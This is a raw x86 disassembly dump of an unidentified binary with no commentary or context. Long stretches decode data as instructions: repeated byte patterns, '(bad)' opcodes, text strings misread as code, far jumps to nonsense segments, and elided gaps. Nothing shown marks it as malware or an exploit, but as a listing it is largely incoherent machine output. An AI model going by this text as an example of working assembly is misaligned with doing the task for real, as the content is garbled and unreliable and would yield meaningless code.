  4219f6:	enter  0xf86f,0xd2
  4219fa:	dec    eax
  4219fb:	mov    dl,0xb8
  4219fd:	mov    ah,dh
  4219ff:	loop   0x421a02
  421a01:	add    BYTE PTR [edi+0x0],al
  421a04:	add    BYTE PTR [eax],al
  421a06:	fwait
  421a07:	mov    eax,0xadcf4d51
  421a0c:	pop    edi
  421a0d:	dec    esi
  421a0e:	pop    ss
  421a0f:	rcr    al,0xc1
  421a12:	shr    BYTE PTR [ecx-0x66],1
  421a15:	imul   ebx,DWORD PTR [edi+0x4dddc2f2],0x55
  421a1c:	cmp    dl,cl
  421a1e:	js     0x421a67
  421a20:	fcom   QWORD PTR [eax+ebx*8+0x3e6f2b3d]
  421a27:	dec    esp
  421a28:	stc    
  421a29:	not    BYTE PTR [edi+0x39]
  421a2c:	and    eax,0xd74c2b7c
  421a31:	xor    al,0xdd
  421a33:	imul   BYTE PTR [edx-0x55f82bda]
  421a39:	xchg   edx,eax
  421a3a:	pop    ebx
  421a3b:	mov    edx,0x283a55cd
  421a40:	push   ebp
  421a41:	das    
  421a42:	es xor eax,0xd19a4119
  421a48:	mov    ds:0xd29270a,eax
  421a4d:	add    BYTE PTR [eax],al
  421a4f:	nop
  421a50:	inc    edx
  421a51:	add    BYTE PTR [eax+edx*4],al
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	nop
  421a58:	inc    edx
  421a59:	add    BYTE PTR [eax+edx*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	nop
  421a60:	inc    edx
  421a61:	add    BYTE PTR [eax+edx*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],al
  421a6f:	mov    al,ds:0xa0040042
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],cl
  421a77:	mov    al,ds:0xa00c0042
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],dl
  421a7f:	mov    al,ds:0xa0140042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],bl
  421a87:	mov    al,ds:0xa01c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],al
  421a8f:	mov    al,0x42
  421a91:	add    BYTE PTR [eax+esi*4],al
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],cl
  421a97:	mov    al,0x42
  421a99:	add    BYTE PTR [eax+esi*4],cl
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],dl
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],dl
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],bl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],bl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax+0x66],bh
  421ab0:	ins    BYTE PTR es:[edi],dx
  421ab1:	jp     0x421b0a
  421ab3:	jbe    0x421afc
  421ab5:	ja     0x421afa
  421ab7:	js     0x421b01
  421ab9:	jno    0x421b1e
  421abb:	inc    edx
  421abc:	inc    bx
  421abe:	push   ebp
  421abf:	jno    0x421b37
  421ac1:	ja     0x421b2a
  421ac3:	dec    edi
  421ac4:	dec    esp
  421ac5:	dec    ebp
  421ac6:	inc    edx
  421ac7:	jno    0x421b3a
  421ac9:	jae    0x421b1e
  421acb:	push   eax
  421acc:	arpl   WORD PTR [ebx+0x76],dx
  421acf:	push   ds
  421ad0:	inc    edx
  421ad1:	add    BYTE PTR [esi+0x1e],bh
  421ad4:	inc    edx
  421ad5:	add    BYTE PTR [esi],dl
  421ad7:	sbb    eax,0xbef0042
  421adc:	mov    dl,0xe
  421ade:	jns    0x421b2e
  421ae0:	xor    BYTE PTR [esi-0x79],cl
  421ae3:	dec    edi
  421ae4:	cmp    eax,0x3e4faf4e
  421ae9:	dec    esi
  421aea:	js     0x421b3a
  421aec:	cmp    ecx,DWORD PTR [esi-0x64]
  421aef:	dec    edi
  421af0:	inc    esp
  421af1:	dec    esi
  421af2:	jae    0x421b42
  421af4:	inc    ecx
  421af5:	dec    esi
  421af6:	xor    BYTE PTR [esi+0x40],cl
  421af9:	dec    esi
  421afa:	pop    esp
  421afb:	pop    ebp
  421afc:	pop    edi
  421afd:	push   edx
  421afe:	cmp    DWORD PTR [esi+0x79],ecx
  421b01:	dec    esi
  421b02:	xor    BYTE PTR [esi-0x79],cl
  421b05:	dec    edi
  421b06:	cmp    eax,0x3e4faf4e
  421b0b:	dec    esi
  421b0c:	js     0x421b5c
  421b0e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b11:	dec    edi
  421b12:	inc    esp
  421b13:	dec    esi
  421b14:	mov    DWORD PTR [edi+0x41],ecx
  421b17:	dec    esi
  421b18:	xor    BYTE PTR [esi+0x40],cl
  421b1b:	dec    esi
  421b1c:	pop    esp
  421b1d:	ins    DWORD PTR es:[edi],dx
  421b1e:	pop    edi
  421b1f:	bound  edi,QWORD PTR [ecx]
  421b21:	dec    esi
  421b22:	jns    0x421b72
  421b24:	xor    BYTE PTR [esi-0x80],cl
  421b27:	dec    edi
  421b28:	cmp    eax,0x394e734e
  421b2d:	dec    esi
  421b2e:	mov    ds:0x304e3a4f,al
  421b33:	dec    esi
  421b34:	inc    esi
  421b35:	dec    esi
  421b36:	pop    esp
  421b37:	jge    0x421b98
  421b39:	jb     0x421baa
  421b3b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b3f:	xchg   ebx,eax
  421b40:	jns    0x421ad2
  421b42:	aas    
  421b43:	dec    esi
  421b44:	test   BYTE PTR [edi+0x30],cl
  421b47:	dec    esi
  421b48:	test   BYTE PTR [edi+0x3c],cl
  421b4b:	dec    esi
  421b4c:	mov    ds:0x734e394f,al
  421b51:	dec    esi
  421b52:	inc    ebp
  421b53:	dec    esi
  421b54:	xor    BYTE PTR [esi+0x44],cl
  421b57:	dec    esi
  421b58:	pop    esp
  421b59:	lea    ebx,[edi-0x7e]
  421b5c:	outs   dx,DWORD PTR ds:[esi]
  421b5d:	xchg   edx,eax
  421b5e:	outs   dx,BYTE PTR ds:[esi]
  421b5f:	xchg   ebx,eax
  421b60:	jle    0x421b05
  421b62:	jns    0x421b04
  421b64:	aas    
  421b65:	dec    esi
  421b66:	test   BYTE PTR [edi+0x30],cl
  421b69:	dec    esi
  421b6a:	test   BYTE PTR [edi+0x3c],cl
  421b6d:	dec    esi
  421b6e:	mov    ds:0x894e394f,al
  421b73:	dec    edi
  421b74:	inc    ebp
  421b75:	dec    esi
  421b76:	xor    BYTE PTR [esi+0x44],cl
  421b79:	dec    esi
  421b7a:	pop    esp
  421b7b:	popf   
  421b7c:	pop    edi
  421b7d:	xchg   edx,eax
  421b7e:	outs   dx,DWORD PTR ds:[esi]
  421b7f:	mov    ds:0xb37ea36e,al
  421b84:	jns    0x421b36
  421b86:	aas    
  421b87:	dec    esi
  421b88:	mov    cs,WORD PTR [edi+0x30]
  421b8b:	dec    esi
  421b8c:	lods   al,BYTE PTR ds:[esi]
  421b8d:	dec    edi
  421b8e:	cmp    eax,0x394e734e
  421b93:	dec    esi
  421b94:	mov    eax,ds:0x304e3a4f
  421b99:	dec    esi
  421b9a:	inc    esp
  421b9b:	dec    esi
  421b9c:	pop    esp
  421b9d:	lods   eax,DWORD PTR ds:[esi]
  421b9e:	pop    edi
  421b9f:	mov    ds:0xb36eb26f,al
  421ba4:	jle    0x421b69
  421ba6:	jns    0x421b68
  421ba8:	aas    
  421ba9:	dec    esi
  421baa:	mov    cs,WORD PTR [edi+0x30]
  421bad:	dec    esi
  421bae:	lods   al,BYTE PTR ds:[esi]
  421baf:	dec    edi
  421bb0:	cmp    eax,0x394e7e4e
  421bb5:	dec    esi
  421bb6:	lahf   
  421bb7:	dec    edi
  421bb8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bbb:	dec    esi
  421bbc:	inc    ebp
  421bbd:	dec    esi
  421bbe:	pop    esp
  421bbf:	mov    ebp,0xc26fb25f
  421bc4:	outs   dx,BYTE PTR ds:[esi]
  421bc5:	ret    
  421bc6:	jle    0x421b9b
  421bc8:	jns    0x421b9a
  421bca:	aas    
  421bcb:	dec    esi
  421bcc:	mov    cs,WORD PTR [edi+0x30]
  421bcf:	dec    esi
  421bd0:	lods   al,BYTE PTR ds:[esi]
  421bd1:	dec    edi
  421bd2:	cmp    eax,0x394f804e
  421bd7:	dec    esi
  421bd8:	lods   al,BYTE PTR ds:[esi]
  421bd9:	dec    edi
  421bda:	cmp    cl,BYTE PTR [esi+0x30]
  421bdd:	dec    esi
  421bde:	inc    esi
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	int    0x5f
  421be3:	ret    0xd26f
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	sar    DWORD PTR [esi-0x1d],cl
  421bea:	jns    0x421bcc
  421bec:	aas    
  421bed:	dec    esi
  421bee:	mov    cs,WORD PTR [edi+0x30]
  421bf1:	dec    esi
  421bf2:	lods   al,BYTE PTR ds:[esi]
  421bf3:	dec    edi
  421bf4:	cmp    eax,0x394f834e
  421bf9:	dec    esi
  421bfa:	mov    ds:0x304e3a4f,al
  421bff:	dec    esi
  421c00:	inc    esp
  421c01:	dec    esi
  421c02:	pop    esp
  421c03:	fstp   QWORD PTR [edi-0x2e]
  421c06:	outs   dx,DWORD PTR ds:[esi]
  421c07:	loop   0x421c77
  421c09:	jecxz  0x421c89
  421c0b:	repz jns 0x421bfe
  421c0e:	aas    
  421c0f:	dec    esi
  421c10:	lea    ecx,[edi+0x30]
  421c13:	dec    esi
  421c14:	lahf   
  421c15:	dec    edi
  421c16:	cmp    eax,0x3c4fa04e
  421c1b:	dec    esi
  421c1c:	xor    BYTE PTR [esi+0x3f],cl
  421c1f:	dec    esi
  421c20:	pop    esp
  421c21:	in     eax,dx
  421c22:	pop    edi
  421c23:	loop   0x421c94
  421c25:	repnz outs dx,BYTE PTR ds:[esi]
  421c27:	repz jle 0x421c2d
  421c2a:	jns    0x421c2c
  421c2c:	jle    0x421c41
  421c2e:	jns    0x421c40
  421c30:	cmp    al,0x4e
  421c32:	jg     0x421c82
  421c34:	xor    BYTE PTR [esi-0x65],cl
  421c37:	dec    edi
  421c38:	xor    cl,BYTE PTR [esi-0x80]
  421c3b:	dec    edi
  421c3c:	cmp    al,0x4e
  421c3e:	lods   eax,DWORD PTR ds:[esi]
  421c3f:	dec    edi
  421c40:	cmp    ecx,DWORD PTR [esi+0x30]
  421c43:	dec    esi
  421c44:	inc    ebp
  421c45:	dec    esi
  421c46:	pop    esp
  421c47:	or     eax,0x126f025f
  421c4c:	outs   dx,BYTE PTR ds:[esi]
  421c4d:	adc    edi,DWORD PTR [esi+0x23]
  421c50:	jns    0x421c72
  421c52:	aas    
  421c53:	dec    esi
  421c54:	add    BYTE PTR [eax],al
  421c56:	ficomp WORD PTR [edx]
  421c58:	inc    edx
  421c59:	add    dl,dl
  421c5b:	sbb    al,0x42
  421c5d:	add    dl,bl
  421c5f:	sbb    al,0x42
  421c61:	add    BYTE PTR [edx-0x11ffbde2],al
  421c67:	sbb    eax,0x1e720042
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [edx-0x41ffbde4],bh
  421c73:	sbb    al,0x42
  421c75:	add    BYTE PTR [esi+0x1e],ch
  421c78:	inc    edx
  421c79:	add    BYTE PTR [edx],ah
  421c7b:	sbb    eax,0xa90d0042
  421c80:	pushf  
  421c81:	clc    
  421c82:	ss mov edx,0x1cd6f89c
  421c88:	inc    edx
  421c89:	add    BYTE PTR [esi-0x45ffbde3],ah
  421c8f:	sbb    eax,0x1dc60042
  421c94:	inc    edx
  421c95:	add    dh,dl
  421c97:	sbb    eax,0x1d0e0042
  421c9c:	inc    edx
  421c9d:	add    dl,bl
  421c9f:	sbb    al,BYTE PTR [edx+0x0]
  421ca2:	cs sbb eax,0x1d1e0042
  421ca8:	inc    edx
  421ca9:	add    BYTE PTR [esi-0x49ffbde2],al
  421caf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cb6:	loop   0x421cd4
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esp+ebx*1],dl
  421cbc:	push   ss
  421cbd:	or     DWORD PTR [eax],0x7050d
  421cc3:	add    BYTE PTR [eax+0x0],al
  421cc6:	cmp    al,BYTE PTR [edx+0x3e]
  421cc9:	ds enter 0x4279,0x0
  421cce:	ins    DWORD PTR es:[edi],dx
  421ccf:	push   ebp
  421cd0:	inc    esp
  421cd1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421cd7:	in     eax,dx
  421cd8:	inc    BYTE PTR [edi]
  421cda:	aas    
  421cdb:	cli    
  421cdc:	mov    ds:0x421cca05,eax
  421ce1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ce7:	xchg   esi,eax
  421ce8:	pushf  
  421ce9:	clc    
  421cea:	mov    ah,0x95
  421cec:	pushf  
  421ced:	clc    
  421cee:	mov    ebx,0xbaf89c95
  421cf3:	xchg   ebp,eax
  421cf4:	pushf  
  421cf5:	clc    
  421cf6:	mov    ecx,0xb8f89c95
  421cfb:	xchg   ebp,eax
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    edi,0xbef89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ebp,0xa6f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	jmp    0x421a:0xd26003f9
  421d15:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d19:	add    BYTE PTR [ebx+0x77],dl
  421d1c:	jbe    0x421d6e
  421d1e:	mov    dh,0x85
  421d20:	pushf  
  421d21:	clc    
  421d22:	sbb    ecx,ebp
  421d24:	push   eax
  421d25:	pop    es
  421d26:	sbb    BYTE PTR [ebx],cl
  421d28:	add    BYTE PTR [eax],al
  421d2a:	into   
  421d2b:	sbb    al,BYTE PTR [edx+0x0]
  421d2e:	sbb    ecx,DWORD PTR [ebx]
  421d30:	add    al,0xe
	...
  421d62:	ins    BYTE PTR es:[edi],dx
  421d63:	inc    eax
  421d64:	inc    edx
  421d65:	add    BYTE PTR [esi+0x66f89c85],dh
  421d6b:	add    BYTE PTR [edx+0x0],ch
  421d6e:	add    BYTE PTR [si+0x0],ah
  421d72:	push   0x64006700
  421d77:	add    BYTE PTR [esi+0x0],ah
  421d7a:	push   0x0
  421d7c:	push   0x66006400
  421d81:	add    BYTE PTR [edi+0x0],ah
  421d84:	push   0x0
  421d86:	push   0x66006700
  421d8b:	add    BYTE PTR [eax+0x0],ch
  421d8e:	add    BYTE PTR [bp+0x0],ah
  421d92:	push   0x66006700
	...
  421d9f:	add    BYTE PTR [eax],al
  421da1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421da7:	dec    edi
  421da8:	lahf   
  421da9:	dec    edi
  421daa:	mov    ds:0x9f4fa64f,al
  421daf:	dec    edi
  421db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db1:	dec    edi
  421db2:	ins    DWORD PTR es:[edi],dx
  421db3:	dec    esi
  421db4:	bound  ecx,QWORD PTR [esi+0x30]
  421db7:	dec    esi
  421db8:	add    BYTE PTR [eax],al
  421dba:	cdq    
  421dbb:	dec    edi
  421dbc:	pushf  
  421dbd:	dec    edi
  421dbe:	fwait
  421dbf:	dec    edi
  421dc0:	ins    DWORD PTR es:[edi],dx
  421dc1:	dec    esi
  421dc2:	bound  ecx,QWORD PTR [esi+0x30]
  421dc5:	dec    esi
  421dc6:	scas   eax,DWORD PTR es:[edi]
  421dc7:	dec    edi
  421dc8:	lods   eax,DWORD PTR ds:[esi]
  421dc9:	dec    edi
  421dca:	lahf   
  421dcb:	dec    edi
  421dcc:	mov    ds:0x624e6d4f,al
  421dd1:	dec    esi
  421dd2:	xor    BYTE PTR [esi+0x0],cl
  421dd5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ddb:	dec    edi
  421ddc:	test   eax,0xa04f934f
  421de1:	dec    edi
  421de2:	fwait
  421de3:	dec    edi
  421de4:	xor    BYTE PTR [esi+0x0],cl
  421de7:	add    BYTE PTR [eax],al
  421de9:	add    BYTE PTR [eax],al
  421deb:	add    BYTE PTR [eax],al
  421ded:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421df4:	mov    WORD PTR [ebp-0x32734274],gs
  421dfa:	mov    ebp,ds
  421dfc:	mov    ebp,gs
  421dfe:	mov    ebp,?
  421e00:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e06:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e0c:	mov    WORD PTR [edx-0x74],?
  421e0f:	jae    0x421d9d
  421e11:	jo     0x421d9f
  421e13:	jno    0x421da1
  421e15:	jbe    0x421da3
  421e17:	ja     0x421da5
  421e19:	je     0x421da7
  421e1b:	jne    0x421da9
  421e1d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e24:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e2a:	lods   al,BYTE PTR ds:[esi]
  421e2b:	jge    0x421de9
  421e2d:	jge    0x421dcd
  421e2f:	(bad)  
  421e30:	jns    0x421ea5
  421e32:	mov    ecx,0x7d738cb1
  421e37:	ins    DWORD PTR es:[edi],dx
  421e38:	enter  0x9fc6,0x26
  421e3c:	jb     0x421e41
  421e3e:	test   eax,0xb956bb17
  421e43:	hlt    
  421e44:	test   al,0x37
  421e46:	test   al,0x7e
  421e48:	fnstenv [ecx-0x6a]
  421e4b:	mov    cl,0x6a
  421e4d:	push   0xffffffce
  421e4f:	or     BYTE PTR [edx],bl
  421e51:	xlat   BYTE PTR ds:[ebx]
  421e52:	out    dx,eax
  421e53:	add    eax,0x9321d7aa
  421e58:	scas   al,BYTE PTR es:[edi]
  421e59:	adc    DWORD PTR [esi],esp
  421e5b:	jge    0x421e80
  421e5d:	fidiv  WORD PTR [edi]
  421e5f:	leave  
  421e60:	hlt    
  421e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e62:	cmp    ax,0x1fc8
  421e66:	mov    dh,cl
  421e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e69:	(bad)  
  421e6a:	and    DWORD PTR [eax],ebx
  421e6c:	and    DWORD PTR [ecx-0x18],esi
  421e6f:	(bad)  [ebx+0x7]
  421e72:	cmc    
  421e73:	enter  0x301a,0x14
  421e77:	inc    eax
  421e78:	inc    edx
  421e79:	add    BYTE PTR [ecx+0x66],dh
  421e7c:	jp     0x421eec
  421e7e:	ret    0x421c
  421e81:	add    BYTE PTR [esi],ah
  421e83:	sbb    eax,0xed080042
  421e88:	adc    al,BYTE PTR [edi]
  421e8a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e91:	ins    BYTE PTR es:[edi],dx
  421e92:	push   0x49657557
  421e97:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e9d:	push   edi
  421e9e:	jp     0x421f1a
  421ea0:	dec    ebp
  421ea1:	push   esi
  421ea2:	arpl   WORD PTR gs:[ecx+0x45],si
  421ea6:	dec    edx
  421ea7:	dec    esi
  421ea8:	data16 ja 0x421ef9
  421eab:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ec6:	inc    ebp
  421ec7:	push   edx
  421ec8:	jb     0x421f3e
  421eca:	inc    esi
  421ecb:	je     0x421f0e
  421ecd:	inc    esi
  421ece:	jae    0x421f46
  421ed0:	dec    ebx
  421ed1:	gs dec ecx
  421ed3:	dec    ebp
  421ed4:	dec    ebp
  421ed5:	pop    edx
  421ed6:	jp     0x421f32
  421ed8:	jbe    0x421f20
  421eda:	pop    ecx
  421edb:	jo     0x421f55
  421edd:	inc    edi
  421ede:	gs ins BYTE PTR es:[edi],dx
  421ee0:	dec    esp
  421ee1:	js     0x421f4b
  421ee3:	inc    edx
  421ee4:	js     0x421f2c
  421ee6:	dec    eax
  421ee7:	inc    ebp
  421ee8:	inc    esp
  421ee9:	inc    esp
  421eea:	push   ecx
  421eeb:	dec    edx
  421eec:	ins    BYTE PTR es:[edi],dx
  421eed:	dec    ebx
  421eee:	jbe    0x421f5e
  421ef0:	pop    eax
  421ef1:	jbe    0x421f3e
  421ef3:	inc    ecx
  421ef4:	fs gs jno 0x421f65
  421ef8:	push   ebx
  421ef9:	inc    ecx
  421efa:	add    BYTE PTR [eax],al
  421efc:	inc    ebx
  421efd:	outs   dx,BYTE PTR ds:[esi]
  421efe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f02:	push   edx
  421f03:	push   ecx
  421f04:	push   0x74000064
  421f09:	jne    0x421f80
  421f0b:	ins    DWORD PTR es:[edi],dx
  421f0c:	push   ecx
  421f0d:	push   eax
  421f0e:	jo     0x421f8a
  421f10:	addr16 jo 0x421f69
  421f13:	pop    eax
  421f14:	add    BYTE PTR [eax],al
  421f16:	push   ecx
  421f17:	pop    ecx
  421f18:	inc    ebx
  421f19:	inc    edx
  421f1a:	outs   dx,BYTE PTR ds:[esi]
  421f1b:	popa   
  421f1c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f20:	jne    0x421f90
  421f22:	dec    ebx
  421f23:	je     0x421f88
  421f25:	bound  esp,QWORD PTR [edi+0x0]
  421f28:	jns    0x421f6f
  421f2a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f2d:	dec    ecx
  421f2e:	ja     0x421f75
  421f30:	dec    eax
  421f31:	inc    ebp
  421f32:	inc    edx
  421f33:	push   ebx
  421f34:	add    BYTE PTR [eax],al
  421f36:	outs   dx,DWORD PTR ds:[esi]
  421f37:	inc    edi
  421f38:	dec    esi
  421f39:	outs   dx,DWORD PTR ds:[esi]
  421f3a:	pop    ecx
  421f3b:	inc    edi
  421f3c:	jb     0x421f85
  421f3e:	jns    0x421fb6
  421f40:	inc    ecx
  421f41:	pop    eax
  421f42:	dec    esp
  421f43:	add    BYTE PTR [eax+0x48],bh
  421f46:	bound  edx,QWORD PTR [ebx+0x43]
  421f49:	pop    eax
  421f4a:	outs   dx,DWORD PTR ds:[esi]
  421f4b:	push   0x4355
  421f50:	dec    esp
  421f51:	ins    BYTE PTR es:[edi],dx
  421f52:	inc    edx
  421f53:	push   0x76666a73
  421f58:	inc    edx
  421f59:	jo     0x421f5b
  421f5b:	add    BYTE PTR [eax],al
  421f5d:	add    BYTE PTR [edi+0x6d],ah
  421f60:	je     0x421fa9
  421f62:	ins    BYTE PTR es:[edi],dx
  421f63:	jae    0x421fcf
  421f65:	inc    esi
  421f66:	ins    DWORD PTR es:[edi],dx
  421f67:	je     0x421fbf
  421f69:	push   0x56584178
  421f6e:	push   ebx
  421f6f:	addr16 dec edx
  421f71:	jo     0x421fe5
  421f73:	js     0x421fe4
  421f75:	pop    eax
  421f76:	dec    ebx
  421f77:	push   esp
  421f78:	dec    esp
  421f79:	jns    0x421fc6
  421f7b:	js     0x421ff5
  421f7d:	outs   dx,BYTE PTR ds:[esi]
  421f7e:	pop    ecx
  421f7f:	jae    0x421fef
  421f81:	push   0x43644448
  421f86:	arpl   WORD PTR [edx+0x55],sp
  421f89:	push   0x42504e67
  421f8e:	push   ebp
  421f8f:	je     0x422006
  421f91:	addr16 dec edi
  421f93:	dec    esp
  421f94:	inc    edx
  421f95:	ins    DWORD PTR es:[edi],dx
  421f96:	inc    esi
  421f97:	inc    esi
  421f98:	inc    esi
  421f99:	arpl   WORD PTR [edx+0x47],bx
  421f9c:	push   ebp
  421f9d:	inc    ebx
  421f9e:	popa   
  421f9f:	push   edx
  421fa0:	dec    esp
  421fa1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fa8:	push   ecx
  421fa9:	push   ebx
  421faa:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fb1:	dec    edx
  421fb2:	jns    0x42201d
  421fb4:	push   edx
  421fb5:	inc    ebx
  421fb6:	jo     0x42202d
  421fb8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fbc:	fs push ebx
  421fbe:	inc    ebx
  421fbf:	push   ebp
  421fc0:	push   eax
  421fc1:	ja     0x421ffe
  421fc3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fc7:	mov    ebp,0xa53ddffb
  421fcc:	js     0x421f87
  421fce:	je     0x421ffb
  421fd0:	inc    esi
  421fd1:	dec    edi
  421fd2:	mov    esi,ss
  421fd4:	add    DWORD PTR [eax],eax
  421fd6:	pop    ebp
  421fd7:	add    BYTE PTR [eax],al
  421fd9:	add    BYTE PTR [ebp+0x16],dl
  421fdc:	push   edi
  421fdd:	mov    BYTE PTR [esp+eiz*2-0x61f7c776],ah
  421fe4:	mov    dl,0x45
  421fe6:	adc    eax,0x41f57076
  421feb:	hlt    
  421fec:	mov    bh,0xe4
  421fee:	sahf   
  421fef:	pop    es
  421ff0:	mov    esi,0x5c02f74c
  421ff5:	sub    dh,BYTE PTR [edi]
  421ff7:	mov    ebp,0xecfb31c2
  421ffc:	inc    ecx
  421ffd:	push   ebx
  421ffe:	cmp    al,0x78
  422000:	loopne 0x421fe3
  422002:	mov    ds:0xf1205b07,al
  422007:	popf   
  422008:	jg     0x42204a
  42200a:	dec    edi
  42200c:	pop    ecx
  42200d:	mov    al,0x78
  42200f:	xchg   esi,eax
  422010:	aam    0xd9
  422012:	adc    ecx,ebp
  422014:	adc    eax,0x6746d5eb
  422019:	ffree  st(6)
  42201b:	pop    edx
  42201c:	push   eax
  42201d:	dec    ebp
  42201e:	cmc    
  42201f:	sbb    esp,0xb1c53ad6
  422025:	inc    BYTE PTR [edx-0x5d4f2346]
  42202b:	inc    edi
  42202c:	stc    
  42202d:	std    
  42202e:	sub    DWORD PTR [eax-0x214de6a8],edx
  422034:	fcomp  st(5)
  422036:	push   cs
	...
  42203f:	add    BYTE PTR [eax],al
  422041:	add    BYTE PTR [eax],ch
  422043:	mov    dl,0xa5
  422045:	push   edx
  422046:	mov    edi,0x7cfaff57
  42204b:	xlat   BYTE PTR fs:[ebx]
  42204d:	push   esi
  42204e:	mov    esp,0xe97b0311
  422053:	(bad)  
  422054:	add    DWORD PTR [eax],eax
  422056:	pop    ebp
  422057:	add    BYTE PTR [eax],al
  422059:	add    BYTE PTR [ebx],bh
  42205b:	mov    ss,WORD PTR [edi-0x4ae09cf4]
  422061:	lea    edi,ds:0x46991957
  422067:	mov    DWORD PTR [ebp-0x3271bc37],0x439df1c5
  422071:	push   ds
  422072:	out    0x7b,eax
  422074:	out    dx,eax
  422075:	lods   eax,DWORD PTR ds:[esi]
  422076:	jb     0x42208b
  422078:	loop   0x422013
  42207a:	in     eax,0xfe
  42207c:	in     eax,dx
  42207d:	outs   dx,DWORD PTR ds:[esi]
  42207e:	mov    edx,0x7c936578
  422083:	xor    al,0x1f
  422085:	xor    ecx,esi
  422087:	mov    ah,0x6c
  422089:	fs nop
  42208b:	dec    edx
  42208c:	out    dx,al
  42208d:	popf   
  42208e:	mov    dl,0xb5
  422090:	xlat   BYTE PTR ds:[ebx]
  422091:	shl    dl,1
  422093:	test   bl,dh
  422095:	ret    
  422096:	lock adc ah,BYTE PTR ds:0xa719f30c
  42209d:	lds    esi,FWORD PTR [edx]
  42209f:	mov    al,ds:0xac62594c
  4220a4:	gs sbb al,0xd1
  4220a7:	cmp    edi,esp
  4220a9:	aas    
  4220aa:	push   eax
  4220ab:	(bad)  
  4220ac:	dec    esp
  4220ad:	inc    esp
  4220ae:	xor    eax,0x25b45073
  4220b3:	pushf  
  4220b4:	cmp    cl,dh
  4220b6:	add    BYTE PTR gs:[eax],al
	...
  4220c1:	add    BYTE PTR [ebx-0x7e80ab],dh
  4220c7:	stos   DWORD PTR es:[edi],eax
  4220c8:	push   DWORD PTR [edi-0x42]
  4220cb:	xchg   esi,eax
  4220cc:	push   0xb147be57
  4220d1:	sub    eax,DWORD PTR [esi-0x29]
  4220d4:	add    DWORD PTR [eax],eax
  4220d6:	pop    ebp
  4220d7:	add    BYTE PTR [eax],al
  4220d9:	add    ch,bl
  4220db:	and    al,0xa1
  4220dd:	js     0x42210a
  4220df:	lock cs icebp 
  4220e2:	push   edx
  4220e3:	jg     0x422091
  4220e5:	cmp    ecx,DWORD PTR [ebp-0x2a541b57]
  4220eb:	jmp    0xfa19:0x94054d2d
  4220f2:	adc    BYTE PTR [ecx-0x735a19d7],0xd0
  4220f9:	lea    ebx,[edx]
  4220fb:	test   ebp,ebx
  4220fd:	and    eax,0xcf229c2b
  422102:	(bad)  
  422103:	push   edi
  422104:	sbb    al,BYTE PTR [edi+0x4f]
  422107:	or     DWORD PTR [eax],edi
  422109:	sar    DWORD PTR [eax-0x62],cl
  42210c:	push   ds
  42210d:	pop    es
  42210e:	mul    dh
  422110:	lahf   
  422111:	stc    
  422112:	jmp    0x1093:0x5b4a30dc
  422119:	mov    eax,0x34482af3
  42211e:	jno    0x4220c3
  422120:	cmp    BYTE PTR [edx+ecx*4],0xad
  422124:	xor    BYTE PTR [ecx+0x5b],ch
  422127:	xchg   ebp,eax
  422128:	sahf   
  422129:	cmc    
  42212a:	popa   
  42212b:	cmp    ebp,ecx
  42212d:	bound  esi,QWORD PTR [ebx+ebp*1-0x28f5336b]
  422134:	in     al,dx
  422135:	shl    DWORD PTR [eax+eax*1+0x0],cl
  42213c:	add    BYTE PTR [eax],al
  42213e:	add    BYTE PTR [eax],al
  422140:	add    BYTE PTR [eax],al
  422142:	cmp    dh,dl
  422144:	cmp    ah,BYTE PTR [esi+edi*8]
  422147:	in     al,dx
  422148:	fimul  WORD PTR ds:[edi+0x9ac6bd5]
  42214f:	(bad)  
  422150:	xor    eax,0x1d7a344
